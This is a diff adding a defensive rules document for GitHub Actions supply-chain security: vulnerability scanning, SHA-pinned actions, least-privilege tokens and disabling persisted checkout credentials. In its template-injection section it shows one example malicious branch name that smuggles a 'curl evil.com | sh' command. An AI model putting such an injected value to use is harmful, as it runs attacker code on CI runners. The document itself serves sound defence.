@@ -1,0 +1,63 @@
+---
+paths:
+  - ".github/workflows/**/*.yml"
+  - ".github/workflows/**/*.yaml"
+---
+
+# Supply-chain security (runtime-neutral)
+
+Rules that apply regardless of language or package manager. Package-manager-specific controls live in `modules/pnpm/rules/pnpm-security.md` and `modules/bun/rules/bun-security.md`.
+
+## OSV-Scanner
+
+`.github/workflows/security.yml` runs OSV-Scanner against committed lockfiles on every push, PR, and weekly cron. Catches vulnerabilities disclosed **after** a dependency was installed (cooldown alone does not help with those). Auto-detects `pnpm-lock.yaml`, `package-lock.json`, `bun.lockb`, `Cargo.lock`, `go.sum`, `requirements.txt`, etc.
+
+## zizmor
+
+Same workflow runs zizmor — static analysis for GitHub Actions misconfigurations (unsafe expression interpolation, overprivileged tokens, missing `persist-credentials: false`, etc.). Treat zizmor findings the way you treat type errors: fix or suppress with a documented reason.
+
+## Pinned actions
+
+Every `uses:` reference in `.github/workflows/*.yml` is pinned to a 40-character commit SHA with the version as a trailing comment:
+
+```yaml
+uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
+```
+
+A commit SHA cannot be reassigned. Even if the tag `v6` is repointed to malicious code, the workflow continues to execute the exact commit that was reviewed.
+
+The trailing-comment placement matters — Dependabot updates the SHA + comment together. Other styles go stale.
+
+## No GitHub-context interpolation in `run:` blocks
+
+Workflow `run:` script bodies must **never** inline `${{ github.<thing> }}` directly — that's a code-injection vector when the value is attacker-controllable (e.g. a malicious PR branch named `; curl evil.com | sh; #`). Pass through `env:` and read shell variables instead:
+
+```yaml
+# Bad — github.head_ref interpolated into shell
+- run: |
+    git checkout "${{ github.head_ref }}"
+
+# Good — env var, no template injection surface
+- run: |
+    git checkout "$BRANCH"
+  env:
+    BRANCH: ${{ github.head_ref }}
+```
+
+Safe to interpolate inline: top-level `env:`, `if:` conditions, action `with:` inputs, `concurrency.group`. Risky: anything that ends up parsed by a shell.
+
+zizmor's `template-injection` rule catches this in CI.
+
+## Least-privilege tokens
+
+Every job declares minimum `permissions:`. The workflow's top-level `permissions: contents: read` denies everything else by default; jobs that need more (`security-events: write` to publish SARIF, `id-token: write` for OIDC) opt in explicitly.
+
+## `persist-credentials: false` on checkouts
+
+`actions/checkout` by default leaves a `GITHUB_TOKEN` on the runner that subsequent steps can use. Disable unless the job actually needs to push.
+
+```yaml
+- uses: actions/checkout@<sha> # vX.Y.Z
+  with:
+    persist-credentials: false
+```
